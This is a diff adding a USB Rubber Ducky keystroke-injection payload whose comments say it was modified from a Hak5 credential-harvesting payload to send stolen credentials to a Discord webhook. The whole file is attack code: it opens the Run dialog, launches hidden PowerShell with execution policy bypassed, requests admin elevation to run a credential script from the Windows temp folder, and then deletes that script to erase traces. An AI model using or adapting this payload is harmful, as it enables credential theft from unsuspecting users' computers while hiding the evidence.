@@ -1,0 +1,24 @@
+ATTACKMODE HID STORAGE
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: IXR
+    REM ORIGINAL CODE: https://github.com/hak5/usbrubberducky-payloads/tree/master/payloads/library/credentials/Duckie-Harvest
+    REM MOODIFIED THE CODE TO USE A DISCORD WEBHOOK RATHER THAN A REVERSE SHELL AND MADE IT FASTER
+DEFINE #DUCKY_DRIVER_LABEL DUCKY
+DEFINE #PS1 sy_cred.ps1
+
+IF ($_OS == WINDOWS ) THEN
+
+    DELAY 150
+    REM Open PowerShell as Admin (Faster Execution)
+    GUI r
+    DELAY 150
+    STRING powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "& {Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File %SystemDrive%\Windows\Temp\#PS1' -WindowStyle Hidden -Verb RunAs}"
+    ENTER
+    DELAY 200
+
+    REM Auto-delete script traces
+    STRING timeout /t 5 /nobreak && del %SystemDrive%\Windows\Temp\#PS1 && exit
+    ENTER
+
+END_IF
